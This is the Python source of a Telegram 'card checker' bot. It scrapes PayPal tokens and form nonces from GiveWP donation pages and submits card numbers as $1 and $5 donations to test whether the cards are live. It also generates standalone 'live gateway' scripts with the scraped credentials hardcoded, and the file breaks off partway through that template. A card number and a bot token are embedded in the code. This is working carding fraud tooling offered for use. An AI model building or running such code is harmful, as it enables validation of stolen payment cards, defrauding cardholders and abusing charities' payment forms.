#!/usr/bin/env python3
# =====================================================
#  Card Checker Bot — FINAL v5 (Hardcoded Live Edition)
#  - Bot extracts everything from page (for checking)
#  - Live gateway file has EVERYTHING hardcoded (no page reads)
#  - No "No GiveWP form" rejection — tries regardless
#  - 1.00 first, then 5.00
#  - Currency auto-detected + fallback
# =====================================================
import telebot
import time
import threading
from telebot import types
import requests, random, json, re, base64
import os
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from fake_useragent import UserAgent
    _UU = UserAgent()
    def rand_ua(): return _UU.random
except:
    _UAS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    ]
    def rand_ua(): return random.choice(_UAS)


token = '8689698569:AAFJjLfJ9ztJg9QNJugf8xJbb0Ernow8vG8'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
myid = ['6843321125']
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}
processing_status = {}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')
if not os.path.exists('users.txt'):
    with open('users.txt', 'w') as f:
        f.write('')


# ============================================================
#  Helpers
# ============================================================
def save_user(user_id):
    try:
        with open('users.txt', 'r') as file:
            users = file.read().splitlines()
        if str(user_id) not in users:
            with open('users.txt', 'a') as file:
                file.write(f"{user_id}\n")
    except:
        with open('users.txt', 'w') as file:
            file.write(f"{user_id}\n")


def is_blocked(user_id):
    try:
        with open("blockusers.txt", "r") as file:
            blocked = [line.strip() for line in file.read().splitlines() if line.strip()]
        return str(user_id) in blocked
    except:
        return False


def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=3):
    for i in range(retries):
        try:
            return bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
        except Exception as e:
            err = str(e)
            if "message is not modified" in err:
                return None
            if "429" in err:
                try:
                    wait_time = int(err.split("retry after ")[1].split(")")[0]) if "retry after" in err else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None


def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=3):
    for i in range(retries):
        try:
            with open(file_path, 'rb') as f:
                return bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
        except Exception as e:
            err = str(e)
            if "429" in err:
                try:
                    wait_time = int(err.split("retry after ")[1].split(")")[0]) if "retry after" in err else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None


def safe_send_message(chat_id, text, parse_mode="HTML", retries=3, reply_markup=None):
    for i in range(retries):
        try:
            return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
        except Exception as e:
            err = str(e)
            if "429" in err:
                try:
                    wait_time = int(err.split("retry after ")[1].split(")")[0]) if "retry after" in err else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None


# ============================================================
#  LIVE RESPONSES
# ============================================================
LIVE_RESPONSES = [
    'CHARGE', 'Payer cannot pay for this transaction',
    'INSTRUMENT_DECLINED', 'ORDER_NOT_APPROVED', 'PAYER_ACTION_REQUIRED',
    'PAYER_CANNOT_PAY', 'PAYMENT_DENIED', 'PAYEE_ACCOUNT_RESTRICTED',
    'PAYEE_NOT_CONSENTED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
    'PERMISSION_DENIED', 'POSTAL_CODE_REQUIRED', 'REFERENCED_CARD_EXPIRED',
    'CARD_EXPIRED', 'AMOUNT_MISMATCH', 'CANNOT_BE_NEGATIVE',
    'CANNOT_BE_ZERO_OR_NEGATIVE', 'CURRENCY_NOT_SUPPORTED',
    'DECIMAL_PRECISION', 'DECIMALS_NOT_SUPPORTED', 'DUPLICATE_INVOICE_ID',
    'INCOMPATIBLE_PARAMETER_VALUE', 'INVALID_PARAMETER_SYNTAX',
    'INVALID_RESOURCE_ID', 'INVALID_STRING_LENGTH', 'ITEM_TOTAL_MISMATCH',
    'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED', 'MISSING_REQUIRED_PARAMETER',
    'ORDER_ALREADY_AUTHORIZED', 'ORDER_ALREADY_CAPTURED',
    'REDIRECT_PAYER_FOR_ALTERNATE_FUNDING', 'VALIDATION_ERROR',
    'UNPROCESSABLE_ENTITY',
    'DO_NOT_HONOR', 'GENERIC_DECLINE', 'CVV2_FAILURE', 'CVV_FAILURE',
    'INSUFFICIENT_FUNDS', 'INVALID_PIN', 'CARD_CLOSED',
    'PICKUP_CARD_SPECIAL_CONDITIONS', 'UNAUTHORIZED_USER', 'AVS_FAILURE',
    'INVALID_OR_RESTRICTED_CARD', 'SOFT_AVS', 'DUPLICATE_TRANSACTION',
    'INVALID_TRANSACTION', 'EXPIRED_CARD', 'INCORRECT_PIN_REENTER',
    'INVALID_DATA_FORMAT', 'INVALID_AMOUNT',
    'INVALID_TRANSACTION_CARD_ISSUER_ACQUIRER', 'INVALID_CAPTURE_DATE',
    'INVALID_CURRENCY_CODE', 'INVALID_ACCOUNT', 'INVALID_TERMINAL',
    'INVALID_MERCHANT', 'BAD_PROCESSING_CODE', 'INVALID_MCC',
    'INVALID_EXPIRATION', 'INVALID_CARD_VERIFICATION_VALUE',
    'INVALID_LIFE_CYCLE_OF_TRANSACTION', 'INVALID_ORDER',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'REVERSAL_REJECTED', 'INVALID_ISSUE',
    'ISSUER_NOT_AVAILABLE_NOT_RETRIABLE', 'ISSUER_NOT_AVAILABLE_RETRIABLE',
    'ACCOUNT_NOT_ON_FILE', 'ERROR_3DS', 'AUTHENTICATION_FAILED',
    'BIN_ERROR', 'PIN_ERROR', 'CARD_EXPIRED_REPLACE',
    'SENDING_LIMIT_EXCEEDED', 'TRANSACTION_RECEIVING_LIMIT_EXCEEDED',
    'CURRENCY_MISMATCH', 'INVALID_ACCOUNT_STATUS',
    'REJECTED_DUE_TO_RISK_REVERSAL', 'TRANSACTION_REFUSED',
    'INTERNAL_SERVER_ERROR', 'INVALID_REQUEST', 'AUTHENTICATION_FAILURE',
    'NOT_AUTHORIZED', 'RESOURCE_NOT_FOUND',
    'PAYER_ACCOUNT_RESTRICTED', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'PAYEE_BLOCKED_TRANSACTION', 'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED',
    'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'LOST_OR_STOLEN',
    'COMPLIANCE_VIOLATION', 'CAPTURE_DECLINED', 'AUTHORIZATION_DENIED',
    'CRYPTOGRAPHIC_FAILURE', 'TX_ATTEMPTS_EXCEED_LIMIT', 'DECLINED',
    'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER',
    'TRANSACTION_NOT_PERMITTED', 'SECURITY_VIOLATION',
    'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED_PLEASE_RETRY',
    'For Visa, Mastercard', 'nothing matches',
    'address and postal code are both incorrect',
    'CVV2/CSC does not match',
    'account closed as fraudulent',
    'card holder wants to stop all recurring payment transactions',
    'Stop recurring payment requests',
    'The requested action could not be performed',
    'semantically incorrect',
    'failed business validation',
    'Payer has not yet approved the Order',
    'Please redirect the payer',
    'provide a valid payment_source',
    'PayPal orders are captured',
]


def is_live_response(resp):
    if not resp:
        return False
    up = str(resp).upper()
    return any(k.upper() in up for k in LIVE_RESPONSES)


RESULT_PRIORITY = [
    ('CHARGE', 200), ('INSUFFICIENT_FUNDS', 195),
    ('INVALID_OR_RESTRICTED_CARD', 190), ('TRANSACTION_NOT_PERMITTED', 188),
    ('Payer cannot pay', 185), ('PAYER_CANNOT_PAY', 185), ('ORDER_NOT_APPROVED', 185),
    ('INSTRUMENT_DECLINED', 182), ('PAYMENT_DENIED', 180),
    ('SUSPECTED_FRAUD', 178), ('CVV2_FAILURE', 175), ('CVV_FAILURE', 175),
    ('EXPIRED_CARD', 172), ('DO_NOT_HONOR', 170),
    ('RESTRICTED_OR_INACTIVE_ACCOUNT', 168),
    ('ACCOUNT_CLOSED', 166), ('LOST_OR_STOLEN', 164),
    ('PAYER_ACCOUNT_LOCKED_OR_CLOSED', 162),
    ('REATTEMPT_NOT_PERMITTED', 160), ('ACCOUNT_BLOCKED_BY_ISSUER', 158),
    ('GENERIC_DECLINE', 155), ('TRANSACTION_REFUSED', 153),
    ('COMPLIANCE_VIOLATION', 150), ('SECURITY_VIOLATION', 148),
    ('CAPTURE_DECLINED', 145), ('AUTHORIZATION_DENIED', 143),
    ('DECLINED_DUE_TO_UPDATED_ACCOUNT', 140), ('CRYPTOGRAPHIC_FAILURE', 138),
    ('TRANSACTION_CANNOT_BE_COMPLETED', 135), ('DECLINED_PLEASE_RETRY', 132),
    ('TX_ATTEMPTS_EXCEED_LIMIT', 130), ('PAYEE_BLOCKED_TRANSACTION', 128),
    ('PAYEE_ACCOUNT_RESTRICTED', 126), ('PAYER_ACCOUNT_RESTRICTED', 124),
    ('DECLINED', 100),
]


def score_result(resp):
    if not resp:
        return 0
    up = str(resp).upper()
    for keyword, score in RESULT_PRIORITY:
        if keyword.upper() in up:
            return score
    return 1


def normalize_result(resp):
    if not resp:
        return "DECLINED"
    up = str(resp).upper()
    if 'ORDER_NOT_APPROVED' in up or 'PAYER_CANNOT_PAY' in up or 'Payer cannot pay' in str(resp):
        return "Payer cannot pay for this transaction."
    return resp


# ============================================================
#  PayPal Tester (for bot scanning)
# ============================================================
class PayPalTester:
    def __init__(self, url):
        self.page_url = url
        parsed = urlparse(url)
        self.url = parsed.netloc
        self.inurl = parsed.path
        if parsed.query:
            self.inurl += "?" + parsed.query

        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.paypal = None
        self.client_id = None
        self.donation = "1.00"
        self.minimum = "5.00"
        self.currency = "USD"
        self.gateway_type = ""
        self.price_levels = []
        self.id_form1 = None
        self.id_form2 = None
        self.nonec = None
        self.au = None
        self.ajax_url = None
        self.current_price_id = None
        self.all_content = ""
        self.page_html = ""
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = type("U", (), {"random": property(lambda s: rand_ua())})()

    def _fetch_page(self):
        for attempt in range(2):
            try:
                r = self.r.get(self.page_url, headers={
                    'user-agent': self.uu.random,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                }, timeout=30)
                if r.status_code == 200:
                    self.page_html = r.text
                    self.all_content = r.text
                    return True
            except:
                time.sleep(1)
        return False

    def _load_iframes(self):
        for pattern in [
            r'<iframe[^>]*src=["\']([^"\']*give[^"\']*)["\']',
            r'<iframe[^>]*src=["\']([^"\']*donation[^"\']*)["\']',
        ]:
            for m in re.finditer(pattern, self.page_html, re.IGNORECASE):
                ifu = m.group(1)
                if ifu.startswith('//'): ifu = 'https:' + ifu
                elif ifu.startswith('/'): ifu = f'https://{self.url}{ifu}'
                elif not ifu.startswith('http'): ifu = f'https://{self.url}/{ifu}'
                try:
                    r = self.r.get(ifu, headers={'user-agent': self.uu.random}, timeout=20)
                    if r.status_code == 200:
                        self.all_content += "\n" + r.text
                        parsed = urlparse(ifu)
                        if not self.id_form2:
                            self.url = parsed.netloc
                            self.inurl = parsed.path
                except: pass

    def _load_external_js(self):
        js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', self.page_html)
        priority = [u for u in js_urls if any(k in u.lower() for k in ['give', 'donation', 'paypal', 'commerce', 'token'])]
        for js_url in priority[:10]:
            try:
                if js_url.startswith('//'): js_url = 'https:' + js_url
                elif js_url.startswith('/'): js_url = f'https://{self.url}{js_url}'
                elif not js_url.startswith('http'): js_url = f'https://{self.url}/{js_url}'
                r = self.r.get(js_url, headers={'user-agent': self.uu.random}, timeout=6)
                if r.status_code == 200:
                    self.all_content += "\n" + r.text
            except: continue

    def _extract_basic(self):
        c = self.all_content

        for p in [r'name="give-form-id-prefix"\s+value="([^"]+)"',
                  r'"give-form-id-prefix"\s*:\s*"([^"]+)"']:
            m = re.search(p, c)
            if m: self.id_form1 = m.group(1); break

        for p in [r'name="give-form-id"\s+value="([^"]+)"',
                  r'"give-form-id"\s*:\s*"([^"]+)"',
                  r'"form_id"\s*:\s*"?(\d+)"?']:
            m = re.search(p, c)
            if m: self.id_form2 = m.group(1); break

        for p in [r'name="give-form-hash"\s+value="([^"]+)"',
                  r'"give-form-hash"\s*:\s*"([^"]+)"',
                  r'"nonce"\s*:\s*"([a-f0-9]{8,12})"']:
            m = re.search(p, c)
            if m: self.nonec = m.group(1); break

        m = re.search(r'name="give-form-minimum"\s+value="([^"]*)"', c)
        if m and m.group(1).strip():
            self.minimum = m.group(1).strip()

        # Currency
        self.currency = "USD"
        for p in [
            r'name="give-currency"\s+value="([A-Za-z]{3})"',
            r'"give-currency"\s*:\s*"([A-Za-z]{3})"',
            r'"currency"\s*:\s*"([A-Za-z]{3})"',
            r'data-currency=["\']([A-Za-z]{3})["\']',
        ]:
            m = re.search(p, c, re.IGNORECASE)
            if m:
                self.currency = m.group(1).upper()
                break

        # Gateway type
        m = re.search(r'name="give-gateway"\s+value="([^"]+)"', c)
        if m:
            self.gateway_type = m.group(1)

        # Price id
        for p in [r'name="give-price-id"\s+value="([^"]+)"',
                  r'"give-price-id"\s*:\s*"([^"]+)"']:
            m = re.search(p, c)
            if m: self.current_price_id = m.group(1); break

        # Price levels
        self.price_levels = []
        for pat, mode in [
            (r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', 1),
            (r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', 2),
        ]:
            for m in re.finditer(pat, c):
                try:
                    if mode == 1:
                        pid, amt = m.group(1), float(m.group(2))
                    else:
                        amt, pid = float(m.group(1)), m.group(2)
                    self.price_levels.append((pid, amt))
                except: pass
        seen = set()
        unique = []
        for pid, amt in self.price_levels:
            if (pid, amt) not in seen and amt > 0:
                seen.add((pid, amt))
                unique.append((pid, amt))
        self.price_levels = sorted(unique, key=lambda x: x[1])

        if 'admin-ajax.php' in c:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'

    def _extract_tokens(self):
        if self.au: return
        c = self.all_content
        for p in [r'"data-client-token":"([^"]+)"',
                  r'data-client-token=["\']([^"\']+)["\']']:
            m = re.search(p, c)
            if m:
                enc = m.group(1)
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    tm = re.search(r'"accessToken":"([^"]+)"', dec)
                    if tm: self.au = tm.group(1)
                    mm = re.search(r'merchant_id=([\w]+)', dec)
                    if mm: self.paypal = mm.group(1)
                    cm = re.search(r'"clientId":"([^"]+)"', dec)
                    if cm: self.client_id = cm.group(1)
                    if self.au: return
                except: pass
        for p in [r'"accessToken"\s*:\s*"([^"]+)"',
                  r'"(A21[A-Za-z0-9+/=_-]{40,})"']:
            m = re.search(p, c, re.IGNORECASE)
            if m: self.au = m.group(1); return

    def _try_oauth(self):
        if self.au or not self.client_id: return
        try:
            auth = base64.b64encode(f"{self.client_id}:".encode()).decode()
            r = self.r.post('https://api-m.paypal.com/v1/oauth2/token',
                headers={'authorization': f'Basic {auth}', 'content-type': 'application/x-www-form-urlencoded'},
                data={'grant_type': 'client_credentials'}, timeout=15)
            if r.status_code == 200:
                j = r.json()
                if 'access_token' in j:
                    self.au = j['access_token']
        except: pass

    def _try_ajax_client_token(self):
        if self.au or not self.ajax_url or not self.id_form2: return
        for action in ['give_paypal_commerce_get_client_token', 'get_client_token',
                       'paypal_get_client_token', 'give_paypal_get_client_token']:
            try:
                r = self.r.post(self.ajax_url, data={'action': action, 'form-id': self.id_form2},
                    headers={'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest'}, timeout=10)
                if r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        token = j.get('data') if isinstance(j.get('data'), str) else None
                        if not token and isinstance(j.get('data'), dict):
                            token = j['data'].get('client_token') or j['data'].get('access_token')
                        if token:
                            try:
                                padded = token + '=' * (-len(token) % 4)
                                dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                                tm = re.search(r'"accessToken":"([^"]+)"', dec)
                                if tm: self.au = tm.group(1); return
                            except: pass
                            if len(token) > 20:
                                self.au = token
                                return
                    except: pass
            except: continue

    def _try_ajax_nonce(self):
        if not self.ajax_url:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        if not self.id_form2:
            return False
        for action in ['give_get_form_nonce', 'give_donation_form_nonce',
                       'give_get_nonce', 'give_form_nonce']:
            try:
                data = {'action': action, 'form_id': self.id_form2}
                headers = {
                    'user-agent': self.uu.random,
                    'x-requested-with': 'XMLHttpRequest',
                    'content-type': 'application/x-www-form-urlencoded',
                }
                r = self.r.post(self.ajax_url, data=data, headers=headers, timeout=10)
                if r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        if 'data' in j and isinstance(j['data'], str) and len(j['data']) >= 6:
                            self.nonec = j['data']
                            return True
                        if 'nonce' in j:
                            self.nonec = j['nonce']
                            return True
                    except: pass
            except: continue
        return False

    def Key(self):
        if not self._fetch_page():
            return None

        self._load_iframes()
        self._load_external_js()

        self._extract_basic()

        if not self.au:
            self._extract_tokens()
        if not self.nonec and self.id_form2:
            self._try_ajax_nonce()
        if not self.au and self.client_id:
            self._try_oauth()
        if not self.au:
            self._try_ajax_client_token()

        if not self.id_form1 and self.id_form2:
            self.id_form1 = f"{self.id_form2}-1"
        if not self.ajax_url:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'

        # Return True even if incomplete — will try anyway
        return True

    def _attempt_charge(self, n, mm, yy, cvc, amt):
        self.donation = amt
        expiry = f"20{yy}-{mm}"

        if not self.au:
            self._extract_tokens()
        if not self.au and self.client_id:
            self._try_oauth()
        if not self.au:
            self._try_ajax_client_token()

        price_ids = ['custom', '3', '4', '', None]
        if self.current_price_id and self.current_price_id not in price_ids:
            price_ids.insert(0, self.current_price_id)

        order_id = None
        last_create_err = ""

        for pid in price_ids:
            fields = {
                'give-form-id-prefix': (None, self.id_form1 or ''),
                'give-form-id': (None, self.id_form2 or ''),
                'give-form-hash': (None, self.nonec or ''),
                'give-amount': (None, amt),
                'give-currency': (None, self.currency),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, random.choice(self.first_name)),
                'give_last': (None, random.choice(self.last_name)),
                'give_email': (None, self.email),
                'give-gateway': (None, 'paypal-commerce'),
            }
            if pid is not None:
                fields['give-price-id'] = (None, pid)
            da2 = MultipartEncoder(fields)
            he3 = {'content-type': da2.content_type, 'user-agent': self.uu.random}

            r3_raw = None
            try:
                r3_raw = self.r.post(self.ajax_url,
                    params={'action': 'give_paypal_commerce_create_order'},
                    headers=he3, data=da2, timeout=15)
                j = r3_raw.json()
                if j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                    order_id = j['data']['id']
                    break
                else:
                    last_create_err = str(j.get('data', {}).get('error', 'Create failed'))
            except Exception as e:
                if r3_raw is not None:
                    last_create_err = r3_raw.text[:150]
                else:
                    last_create_err = f"Exception: {str(e)[:100]}"

        if not order_id:
            return None, last_create_err

        metadata = self.paypal or self.client_id or ''
        he4 = {
            'authorization': f'Bearer {self.au or ""}',
            'paypal-client-metadata-id': metadata,
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': self.uu.random,
        }
        da3 = {
            'payment_source': {
                'card': {
                    'number': n, 'expiry': expiry, 'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        confirm_body = ""
        try:
            cr = self.r.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                headers=he4, json=da3, timeout=15)
            confirm_body = cr.text
        except: pass

        for pid in price_ids:
            fields = {
                'give-form-id-prefix': (None, self.id_form1 or ''),
                'give-form-id': (None, self.id_form2 or ''),
                'give-form-hash': (None, self.nonec or ''),
                'give-amount': (None, amt),
                'give-currency': (None, self.currency),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, random.choice(self.first_name)),
                'give_last': (None, random.choice(self.last_name)),
                'give_email': (None, self.email),
                'give-gateway': (None, 'paypal-commerce'),
            }
            if pid is not None:
                fields['give-price-id'] = (None, pid)
            da4 = MultipartEncoder(fields)
            he5 = {'content-type': da4.content_type, 'user-agent': self.uu.random}
            try:
                r5 = self.r.post(self.ajax_url,
                    params={'action': 'give_paypal_commerce_approve_order', 'order': order_id},
                    headers=he5, data=da4, timeout=15)
                text = r5.text + confirm_body

                if '"success":true' in text.lower() and 'error' not in text.lower():
                    return f'CHARGE {amt}$', text

                for kw in LIVE_RESPONSES:
                    if kw.upper() in text.upper():
                        return kw, text

                try:
                    err = str(r5.json()['data']['error'])[:200]
                    if err and err != "None":
                        return err, text
                except: pass
            except: pass

        return confirm_body[:150] if confirm_body else "Approve failed", confirm_body

    def Charge(self, ccx):
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "Invalid card format"
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]

        if not self.nonec and self.id_form2:
            self._try_ajax_nonce()
        if not self.id_form1 and self.id_form2:
            self.id_form1 = f"{self.id_form2}-1"

        attempts = ["1.00", "5.00"]
        all_results = []
        create_errors = []

        for amt in attempts:
            result, text = self._attempt_charge(n, mm, yy, cvc, amt)
            if result:
                all_results.append({'amount': amt, 'result': result, 'text': text})
            else:
                create_errors.append((amt, text))

        if not all_results:
            if create_errors:
                last_amt, last_err = create_errors[-1]
                self.donation = last_amt
                return last_err if last_err else "No response from server"
            return "No response from server"

        best = max(all_results, key=lambda x: score_result(x['result']))
        self.donation = best['amount']
        return normalize_result(best['result'])


# ============================================================
#  Bridge
# ============================================================
TEST_CARD = '4059986126444431|11|30|947'


def check_single_link(link):
    try:
        if not link.startswith(("http://", "https://")):
            return {'link': link, 'live': False, 'respons': 'Invalid URL', 'amount': '1.00', 'tester': None}
        tester = PayPalTester(link)
        tester.Key()
        result = tester.Charge(TEST_CARD)
        return {
            'link': link,
            'live': is_live_response(result),
            'respons': result,
            'amount': tester.donation,
            'minimum': tester.minimum,
            'tester': tester,
        }
    except Exception as e:
        return {'link': link, 'live': False, 'respons': str(e)[:100], 'amount': '1.00', 'tester': None}


# ============================================================
#  Gateway generator — HARDCODED
# ============================================================
def generate_gateway_code(result, link, amount="1.00", tester=None):
    parsed = urlparse(link)
    host = parsed.netloc
    path = parsed.path
    if parsed.query:
        path += "?" + parsed.query

    if 'ORDER_NOT_APPROVED' in result.upper() or 'PAYER_CANNOT_PAY' in result.upper():
        display_result = "Payer cannot pay for this transaction."
    else:
        display_result = result

    id_form1 = tester.id_form1 if tester else ''
    id_form2 = tester.id_form2 if tester else ''
    nonec = tester.nonec if tester else ''
    au = tester.au if tester else ''
    paypal_metadata = tester.paypal if tester else ''
    client_id = tester.client_id if tester else ''
    currency = tester.currency if tester else 'USD'
    minimum = tester.minimum if tester else '5.00'
    ajax_url = tester.ajax_url if tester and tester.ajax_url else f'https://{host}/wp-admin/admin-ajax.php'
    price_levels_json = json.dumps(tester.price_levels if tester else [])
    current_price_id = tester.current_price_id if tester else ''

    return f'''#!/usr/bin/env python3
# =====================================================
#  Live Gateway — HARDCODED Edition
#  Link     : {link}
#  Response : {display_result}
#  Amount   : {amount}
#  Currency : {currency}
# =====================================================

import requests, random, time
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============ HARDCODED DATA ============
AJAX_URL      = "{ajax_url}"
ID_FORM1      = "{id_form1}"
ID_FORM2      = "{id_form2}"
NONCE         = "{nonec}"
ACCESS_TOKEN  = "{au}"
PAYPAL_META   = "{paypal_metadata}"
CLIENT_ID     = "{client_id}"
CURRENCY      = "{currency}"
MINIMUM       = "{minimum}"
PREFERRED_AMT = "{amount}"
PRICE_LEVELS  = {price_levels_json}
CURRENT_PID   = "{current_price_id}"

LIVE_RESPONSES = [
    'CHARGE', 'Payer cannot pay for this transaction',
    'INSTRUMENT_DECLINED', 'ORDER_NOT_APPROVED', 'PAYER_ACTION_REQUIRED',
    'PAYER_CANNOT_PAY', 'PAYMENT_DENIED', 'PAYEE_ACCOUNT_RESTRICTED',
    'PAYEE_NOT_CONSENTED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
    'PERMISSION_DENIED', 'POSTAL_CODE_REQUIRED', 'REFERENCED_CARD_EXPIRED',
    'CARD_EXPIRED', 'AMOUNT_MISMATCH', 'DUPLICATE_INVOICE_ID',
    'INVALID_RESOURCE_ID', 'ITEM_TOTAL_MISMATCH',
    'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
    'ORDER_ALREADY_AUTHORIZED', 'ORDER_ALREADY_CAPTURED',
    'REDIRECT_PAYER_FOR_ALTERNATE_FUNDING', 'VALIDATION_ERROR',
    'UNPROCESSABLE_ENTITY',
    'DO_NOT_HONOR', 'GENERIC_DECLINE', 'CVV2_FAILURE', 'CVV_FAILURE',
    'INSUFFICIENT_FUNDS', 'INVALID_PIN', 'CARD_CLOSED',
    'PICKUP_CARD_SPECIAL_CONDITIONS', 'UNAUTHORIZED_USER', 'AVS_FAILURE',
    'INVALID_OR_RESTRICTED_CARD', 'SOFT_AVS', 'DUPLICATE_TRANSACTION',
    'INVALID_TRANSACTION', 'EXPIRED_CARD', 'INVALID_DATA_FORMAT',
    'INVALID_AMOUNT', 'INVALID_ACCOUNT', 'INVALID_MERCHANT',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'REVERSAL_REJECTED',
    'ISSUER_NOT_AVAILABLE_NOT_RETRIABLE', 'ISSUER_NOT_AVAILABLE_RETRIABLE',
    'AUTHENTICATION_FAILED', 'BIN_ERROR', 'PIN_ERROR',
    'SENDING_LIMIT_EXCEEDED', 'TRANSACTION_RECEIVING_LIMIT_EXCEEDED',
    'CURRENCY_MISMATCH', 'INVALID_ACCOUNT_STATUS', 'CURRENCY_NOT_SUPPORTED',
    'REJECTED_DUE_TO_RISK_REVERSAL', 'TRANSACTION_REFUSED',
    'INTERNAL_SERVER_ERROR', 'INVALID_REQUEST', 'AUTHENTICATION_FAILURE',
    'NOT_AUTHORIZED', 'RESOURCE_NOT_FOUND',
    'PAYER_ACCOUNT_RESTRICTED', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'PAYEE_BLOCKED_TRANSACTION', 'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED',
    'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'LOST_OR_STOLEN',
    'COMPLIANCE_VIOLATION', 'CAPTURE_DECLINED', 'AUTHORIZATION_DENIED',
    'CRYPTOGRAPHIC_FAILURE', 'TX_ATTEMPTS_EXCEED_LIMIT', 'DECLINED',
    'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER',
    'TRANSACTION_NOT_PERMITTED', 'SECURITY_VIOLATION',
    'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED_PLEASE_RETRY',
    'For Visa, Mastercard', 'nothing matches',
    'address and postal code are both incorrect',
    'CVV2/CSC does not match',
    'account closed as fraudulent',
    'The requested action could not be performed',
    'Payer has not yet approved the Order',
    'Please redirect the payer',
    'provide a valid payment_source',
    'PayPal orders are captured',
]


def luhn_check(card_num):
    def digits_of(n): return [int(d) for d in str(n)]
    try:
        digits = digits_of(card_num)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        total = sum(odd_digits)
        for d in even_digits:
            total += sum(digits_of(d * 2))
        return total % 10 == 0
    except:
        return False


class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name  = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self.donation = PREFERRED_AMT

    def _try_create_order(self, amt, currency, pid):
        fields = {{
            'give-form-id-prefix': (None, ID_FORM1),
            'give-form-id': (None, ID_FORM2),
            'give-form-hash': (None, NONCE),
            'give-amount': (None, amt),
            'give-currency': (None, currency),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }}
        if pid is not None:
            fields['give-price-id'] = (None, pid)

        da = MultipartEncoder(fields)
        he = {{'content-type': da.content_type, 'user-agent': self.uu.random}}

        r3_raw = None
        try:
            r3_raw = self.r.post(AJAX_URL,
                params={{'action': 'give_paypal_commerce_create_order'}},
